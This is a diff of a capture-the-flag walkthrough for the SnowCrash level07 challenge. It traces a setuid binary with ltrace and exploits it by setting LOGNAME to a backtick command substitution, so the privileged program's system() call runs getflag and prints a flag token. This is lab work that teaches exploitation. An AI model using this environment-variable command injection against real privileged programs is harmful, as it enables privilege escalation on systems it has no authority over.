@@ -1,5 +1,4 @@
-guest:
-
+List dir content
 level07@SnowCrash:~$ ls -la
 total 24
 dr-x------ 1 level07 level07  120 Mar  5  2016 .
@@ -9,9 +8,11 @@ d--x--x--x 1 root    users    340 Aug 30  2015 ..
 -r-x------ 1 level07 level07  675 Apr  3  2012 .profile
 -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
 
+Run level07 binary
 level07@SnowCrash:~$ ./level07
 level07
 
+Trace the binary
 level07@SnowCrash:~$ ltrace ./level07
 __libc_start_main(0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 <unfinished ...>
 getegid()                                                                         = 2007
@@ -26,17 +27,9 @@ system("/bin/echo level07 "level07
 <... system resumed> )                                                            = 0
 +++ exited (status 0) +++
 
-level07@SnowCrash:~$ echo $LOGNAME
-level07
-
+Reassign the LOGNAME to our command
 level07@SnowCrash:~$ export LOGNAME=\`getflag\`
 
-level07@SnowCrash:~$ echo $LOGNAME
-`getflag`
-
+Run the binary again
 level07@SnowCrash:~$ ./level07
 Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
-
-level07@SnowCrash:~$ su level08
-Password:
-level08@SnowCrash:~$
